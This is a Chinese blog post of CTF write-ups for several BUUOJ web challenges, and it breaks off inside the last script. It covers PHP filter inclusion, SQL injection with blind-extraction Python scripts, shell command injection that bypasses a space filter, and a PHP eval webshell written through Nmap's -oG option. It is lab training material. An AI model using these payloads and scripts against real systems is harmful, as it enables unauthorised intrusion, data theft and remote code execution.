{"title":"BUUOJ刷题1月第五周","uid":"b68352af34123beef3525b42882db0af","slug":"BUUOJ刷题1月第四周","date":"2021-01-29T15:52:22.000Z","updated":"2021-06-28T14:57:56.601Z","comments":true,"path":"api/articles/BUUOJ刷题1月第四周.json","keywords":"A1andNS","cover":"https://gitee.com/A1andNS/blogimage/raw/master/img/3.png","content":"<h2 id=\"BSidesCF-2020-Had-a-bad-day\"><a href=\"#BSidesCF-2020-Had-a-bad-day\" class=\"headerlink\" title=\"[BSidesCF 2020]Had a bad day\"></a>[BSidesCF 2020]Had a bad day</h2><p><strong>考点：PHP伪协议</strong></p>\n<p>这题上来就是一个选择，选择的内容是在url处category参数处，输入一个单引号，引发php报错。由此可以知道url传入的参数会先与”.php”进行拼接，然后使用include()来包含。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210122002428.png\" alt=\"1\"></p>\n<p>这里想要直接输入flag和index都是不行的。但是php伪协议是可以使用的，所以利用php://来读取源码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'category'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"woofers\"</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span>  <span class=\"token keyword type-declaration\">false</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strpos</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"meowers\"</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span>  <span class=\"token keyword type-declaration\">false</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strpos</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"index\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">include</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Sorry, we currently only support woofers and meowers.\"</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看到代码恍然大悟，这就是为什么使用php://可以读index.php源码而直接传index是不行的了，因为第一次匹配到的位置的索引为0,不满足条件语句。</p>\n<p>发现可以构造index/../flag，也可以构造多一个协议，例如<code>php://filter/read=convert.base64-encode/index/resource=flag</code></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/20210122002416.png\" alt=\"2\"></p>\n<p>解码base64得到：</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">&lt;!-- Can you read this flag? --&gt;\n&lt;?php\n &#x2F;&#x2F; flag&#123;afb95817-2aed-477a-94f4-7b9230bc4245&#125;\n?&gt;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"BJDCTF-2nd-简单注入\"><a href=\"#BJDCTF-2nd-简单注入\" class=\"headerlink\" title=\"[BJDCTF 2nd]简单注入\"></a>[BJDCTF 2nd]简单注入</h2><p><strong>考点：SQL注入(盲注)</strong></p>\n<p>首先尝试注入，fuzz一下，发现’被过滤了。宽字节方式也不行，暂时卡住了，使用dirsearch扫描一下目录看看有无发现。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129215747248.png\" alt=\"image-20210129215747248\"></p>\n<p>check.php访问后只有一句You know，P3rh4ps needs a girl friend，就没有什么有用信息了。看一下robots.txt，发现有一个hint.txt。</p>\n<p>得到了SQL查询语句<code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code>，因为<code>&#39;</code>已经被过滤了，无法使用了，所以如果想要把语句闭合，就需要利用password的第一个单引号，那么就要让username的第二个引号被转义，我们可以使用<code>\\</code>，这个符号并没有被过滤。</p>\n<p>此时SQL查询语句就变成了</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span><span class=\"token string\">'\\' and password='</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'password'</span><span class=\"token punctuation\">]</span>'<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这个时候再在password处去构造 <code>or 1=1#</code>，就会变成：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> username<span class=\"token operator\">=</span><span class=\"token string\">'\\' and password='</span><span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">#'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>但是password位<code>=</code>被过滤了，改用&lt;，再password处构造<code>or 1&lt;2#</code></p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129221001304.png\" alt=\"image-20210129221001304\"></p>\n<p>显示BJD needs to be stronger。</p>\n<p>使用<code>or 1&gt;2#</code>,则显示需要girl friend</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129221254276.png\" alt=\"image-20210129221254276\"></p>\n<p>报错盲注入，</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token comment\"># url是随时更新的，具体的以做题时候的为准</span>\nurl <span class=\"token operator\">=</span> <span class=\"token string\">'http://50a9254c-9687-46d1-b48c-adb3488702ba.node3.buuoj.cn/index.php'</span>\ncookie <span class=\"token operator\">=</span> <span class=\"token string\">'CooKie: UM_distinctid=17748ea81331be-00f63fed48a451-13e3563-144000-17748ea81343e8'</span>\ndata <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"username\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"admin\\\\\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"password\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span>\n        <span class=\"token punctuation\">&#125;</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\ni <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 从可打印字符开始</span>\n    begin <span class=\"token operator\">=</span> <span class=\"token number\">32</span>\n    end <span class=\"token operator\">=</span> <span class=\"token number\">126</span>\n    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n    <span class=\"token keyword\">while</span> begin <span class=\"token operator\">&lt;</span> end<span class=\"token punctuation\">:</span>\n        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 延时操作</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>begin<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span>\n        data<span class=\"token punctuation\">[</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"or ascii(substr(password,&#123;0&#125;,1))&lt;&#123;1&#125;#\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> mid<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># print(r.text)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'girl friend'</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>           <span class=\"token comment\"># 布尔判断成立的时候的情况</span>\n            begin <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            end <span class=\"token operator\">=</span> mid\n            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>begin <span class=\"token operator\">+</span> end<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n\n    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>     <span class=\"token comment\"># 退出使的判断会多做一次，导致mid比实际的要大1</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以得到密码为OhyOuFOuNdit</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129223838211.png\" alt=\"image-20210129223838211\"></p>\n<p>使用获取的密码登陆即可。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210129223912149.png\" alt=\"image-20210129223912149\"></p>\n<h2 id=\"WUSTCTF2020-朴实无华\"><a href=\"#WUSTCTF2020-朴实无华\" class=\"headerlink\" title=\"[WUSTCTF2020]朴实无华\"></a>[WUSTCTF2020]朴实无华</h2><p><strong>看点：HTTP Header、PHP弱类型</strong></p>\n<p>开局就报错了：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Hack me\nWarning: Cannot modify header information - headers already sent by (output started at &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:3) in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 4<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>产生这种错误的原因是发送或修改HTTP头信息的方法在有输出后才被调用。为什么会产生这种错误呢？因为http response总是先发送http header 然后才是html信息。所以PHP也必须先把头信息发出给web服务器，而且只能发送一次，再次之后就不允许再修改头信息了。这里的输出可以是<code>print</code>、<code>echo</code>、<code>&lt;html&gt;</code>,一旦有输出信息，http header就已经发送，所以再要更改就会产生报错。</p>\n<p>通过上面的警告，line4是指向调用header()失败的脚本行数。而先于header()的输出实在index.php的第3行。这里就是我们需要去找的过早输出的点。从报错前有输出hack me，可以猜测，第3行可能是使用了echo。</p>\n<p>dirsearch扫描目录，访问一下robots.txt看看，发现一个fAke_f1agggg.php，内如其名一个假flag，但是在假flag的这个http header发现了一个fl4g.php</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210130174256976.png\" alt=\"image-20210130174256976\"></p>\n<p>访问fl4g.php，依旧是PHP警告，也是和index.php一样的问题，但是这次有源码，好像是让我们闯关。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//level 1</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$num</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2020</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">2021</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"鍘婚潪娲插惂\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里要求num必须小于2020，num+1要大于2021。这个肯定是涉及到弱类型绕过问题。intval()函数用于获取变量的整数值，通过使用指定的进制base转换(默认是十进制)，返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并且返回1。</p>\n<p><strong>返回值</strong></p>\n<p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p>\n<p>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>\n<p>字符串有可能返回 0，虽然取决于字符串最左侧的字符。</p>\n<p>由于靶机是php5的环境，所以可以使用2e4来绕过，2e4会被解析为2，而2e4+1被解析为20001</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210130184012985.png\" alt=\"image-20210130184012985\"></p>\n<p>成功绕过第一关。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//level 2</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n   <span class=\"token variable\">$md5</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$md5</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$md5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n       <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">else</span>\n       <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"鍘婚潪娲插惂\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>第二关是md5的弱类型比较，重点是需要原来的值的md5要==原来的值，这个问题就是0e开头的字符串md5()后还是0e开头。这就是双md5碰撞问题。</p>\n<p>找了一圈，发现了一个0e18bb6e1d5c2e19b63898aeed6b37ea</p>\n<p>他的md5还是0e0a710a092113dd5ec9dd47d4d7b86f</p>\n<p>所以使用payload:</p>\n<p><code>md5=0e18bb6e1d5c2e19b63898aeed6b37ea</code>,可惜本地测试一下发现比较不成功，后来又发现一个payload:<code>0e215962017</code><br>最后一关获取flag</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">//get flag</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'get_flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'get_flag'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$get_flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_ireplace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"wctf2020\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get_flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"蹇埌闈炴床浜�\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"鍘婚潪娲插惂\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>过滤了空格，所以不能直接使用空格了，改用$IFS$1,cat不可用，改用tac命令。</p>\n<p>payload:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;00d5f171-fda9-4cfb-8d25-c9bceeafc667.node3.buuoj.cn&#x2F;fl4g.php?num&#x3D;2e5&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h2 id=\"网鼎杯-2020-朱雀组-Nmap\"><a href=\"#网鼎杯-2020-朱雀组-Nmap\" class=\"headerlink\" title=\"[网鼎杯 2020 朱雀组]Nmap\"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><strong>考点：nmap写webshell</strong></p>\n<p>这里很明确的提到了nmap，直接去查看了一下nmap的中文手册，发现有很多Output选项，所以可以尝试用output选项来写webshell。</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">Nmap输出格式\n\n-oN &lt;filespec&gt; (标准输出)\n要求将标准输出直接写入指定 的文件。如上所述，这个格式与交互式输出 略有不同。\n\n-oX &lt;filespec&gt; (XML输出)\n要求XML输出直接写入指定 的文件。Nmap包含了一个文档类型定义(DTD)，使XML解析器有效地 进行XML输出。这主要是为了程序应用，同时也可以协助人工解释 Nmap的XML输出。DTD定义了合法的格式元素，列举可使用的属性和 值。最新的版本可在 http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F;data&#x2F;nmap.dtd获取。\n\nXML提供了可供软件解析的稳定格式输出，主要的计算机 语言都提供了免费的XML解析器，如C&#x2F;C++，Perl，Python和Java。 针对这些语言有一些捆绑代码用于处理Nmap的输出和特定的执行程序。 例如perl CPAN中的Nmap::Scanner 和Nmap::Parser。 对几乎所有与Nmap有接口的主要应用来说，XML是首选的格式。\n\nXML输出引用了一个XSL样式表，用于格式化输出结果，类似于 HTML。最方便的方法是将XML输出加载到一个Web浏览器，如Firefox 或IE。由于nmap.xsl文件的绝对 路径，因此通常只能在运行了Nmap的机器上工作(或类似配置的机器)。 类似于任何支持Web机器的HTML文件，--stylesheet 选项可用于建立可移植的XML文件。\n\n-oS &lt;filespec&gt; (ScRipT KIdd|3 oUTpuT)\n脚本小子输出类似于交互工具输出，这是一个事后处理，适合于 &#39;l33t HaXXorZ， 由于原来全都是大写的Nmap输出。这个选项和脚本小子开了玩笑，看上去似乎是为了 “帮助他们”。\n\n-oG &lt;filespec&gt; (Grep输出)\n这种方式最后介绍，因为不建议使用。XML输格式很强大，便于有经验 的用户使用。XML是一种标准，由许多解析器构成，而Grep输届更简化。XML 是可扩展的，以支持新发布的Nmap特点。使用Grep输出的目的是忽略这些 特点，因为没有足够的空间。\n\n然面，Grep输出仍然很常使用。它是一种简单格式，每行一个主机，可以 通过UNIX工具(如grep、awk、cut、sed、diff)和Perl方便地查找和分解。常可 用于在命令行上进行一次性测式。查找ssh端口打开或运行Sloaris的主机，只需 要一个简单的grep主机说明，使用通道并通过awk或cut命令打印所需的域。\n\nGrep输出可以包含注释(每行由#号开始)。每行由6个标记的域组成，由制表符及 冒号分隔。这些域有主机，端口， 协议，忽略状态， 操作系统，序列号， IPID和状态。\n\n这些域中最重要的是Ports，它提供 了所关注的端口的细节，端口项由逗号分隔。每个端口项代表一个所关注的端口， 每个子域由&#x2F;分隔。这些子域有：端口号， 状态，协议， 拥有者，服务， SunRPCinfo和版本信息。\n\n对于XML输出，本手册无法列举所有的格式，有关Nmap Grep输出的更详细信息可 查阅http:&#x2F;&#x2F;www.unspecific.com&#x2F;nmap-oG-output。\n\n-oA &lt;basename&gt; (输出至所有格式)\n为使用方便，利用-oA&lt;basename&gt;选项 可将扫描结果以标准格式、XML格式和Grep格式一次性输出。分别存放在 &lt;basename&gt;.nmap，&lt;basename&gt;.xml和 &lt;basename&gt;.gnmap文件中。也可以在文件名前 指定目录名，如在UNIX中，使用~&#x2F;nmaplogs&#x2F;foocorp&#x2F;， 在Window中，使用c:\\hacking\\sco on Windows。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>payload:</p>\n<p><code>127.0.0.1 | &lt;?php eval($_POST[&#39;alan&#39;]);?&gt; -oG alan.php</code> </p>\n<p>显示hacker，发现php被过滤，只要出现php就会出现hacker</p>\n<p>尝试使用phtml，发现可以使用。</p>\n<p><img src=\"https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210131111426880.png\" alt=\"image-20210131111426880\"></p>\n<p>被转义了，说明存在转义函数，那就让后面的内容称为一个字符串，这样转义时转义的时单引号。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">127.0.0.1 | &#39; &lt;?&#x3D;eval($_POST[&#39;alan&#39;]);?&gt; -oG alan.phtml &#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>蚁剑连接这里在/flag可以获取flag，在index.php中可以看到使用了两个过滤函数，escapeshellarg()、escapeshellcmd()</p>\n<h2 id=\"极客大挑战-2019-FinalSQL\"><a href=\"#极客大挑战-2019-FinalSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]FinalSQL\"></a>[极客大挑战 2019]FinalSQL</h2><p><strong>考点：SQL注入异或</strong></p>\n<p>注入点按照提示就是id处了，然后过滤了很多东西，例如空格、and等等。可以使用异或来做，</p>\n<p>id=1^1是click，id=1^0是error，上脚本：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token comment\"># url是随时更新的，具体的以做题时候的为准</span>\n<span class=\"token comment\"># url = 'http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php'</span>\ncookie <span class=\"token operator\">=</span> <span class=\"token string\">'CooKie: UM_distinctid=17748ea81331be-00f63fed48a451-13e3563-144000-17748ea81343e8'</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\ni <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 从可打印字符开始</span>\n    begin <span class=\"token operator\">=</span> <span class=\"token number\">32</span>\n    end <span class=\"token operator\">=</span> <span class=\"token 